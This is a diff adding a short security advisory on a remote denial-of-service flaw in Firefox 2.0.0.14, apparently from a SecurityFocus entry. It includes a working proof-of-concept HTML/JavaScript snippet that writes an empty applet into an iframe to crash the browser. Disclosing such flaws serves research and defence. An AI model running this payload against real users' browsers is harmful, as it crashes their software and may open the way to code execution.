@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/29318/info
+
+Mozilla Firefox is prone to a remote denial-of-service vulnerability when running certain JavaScript commands on empty applets in an iframe.
+
+Successful exploits can allow attackers to crash the affected browser, resulting in denial-of-service conditions. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.
+
+This issue affects Firefox 2.0.0.14; other versions may also be vulnerable. 
+
+<script> // It might not work on your platform due to a ton of reasons. // tested on WinXP SP2 JRE version 1.6.0_01 function run() { var data = '<applet src="javascript:" id="x">'; y.document.open(); y.document.write(data); y.document.close(); } </script> <input name="button" value="Run" onclick="run()" type="button"> <iframe name="y" id="x" src="" frameborder="1" height="200"></iframe> 
